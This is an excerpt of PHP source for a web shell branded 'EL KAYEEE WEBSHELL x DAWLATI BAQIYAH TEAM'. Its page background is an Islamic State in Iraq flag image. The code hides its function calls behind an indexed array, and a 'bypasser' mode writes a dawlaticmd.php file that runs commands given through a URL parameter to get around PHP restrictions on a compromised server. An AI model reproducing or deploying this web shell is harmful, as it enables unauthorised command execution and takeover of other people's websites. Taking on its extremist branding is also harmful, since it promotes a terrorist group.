...
<head>
    ...
    <title>EL KAYEEE WEBSHELL x DAWLATI BAQIYAH TEAM [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    ...
    <style>
        ...
        body {
                background-image: url('https://upload.wikimedia.org/wikipedia/commons/f/fe/Flag_of_the_Islamic_State_in_Iraq.jpg');
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-solid fa-user"></i>&nbsp;EL KAYE WEBSHELL</li>
            <li class="logo-geckonebula"><img width="400" height="400" src="https://i.ibb.co.com/NdbZRshM/download.jpg" align="right"></li>
...
if ($_GET['terminal'] == "bypasser") {
    if (!$fungsi[3]('dawlaticmd.php') && $fungsi[4]($fungsi[0]())) {
        ...
        $fungsi[28]("dawlaticmd.php", $fungsi[32]($connt));
        echo '<script>alert("Success!");</script>';
        echo '<script>alert("Your Files Bypass dawlaticmd.php");</script>';
        echo '<script>alert("u can use dawlaticmd.php?cmdd=id to bypass php version");</script>';
